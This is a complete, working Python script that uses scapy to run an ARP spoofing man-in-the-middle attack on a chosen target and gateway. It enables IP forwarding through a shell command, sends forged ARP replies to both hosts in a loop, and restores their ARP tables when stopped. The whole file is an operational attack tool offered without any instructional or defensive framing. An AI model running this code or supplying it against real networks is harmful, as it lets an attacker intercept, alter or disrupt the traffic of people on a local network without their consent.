#!/usr/bin/env python

import scapy.all as scapy,time,argparse
import subprocess


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP.")
    options = parser.parse_args()
    return options

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destonation_ip, source_ip):
    destonation_mac = get_mac(destonation_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destonation_ip, hwdst=destonation_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    set_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        set_packets_count += 2
        print("[+] Packets sent: " + str(set_packets_count), end="\r")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] Detected CTRL + C ... Exit program...")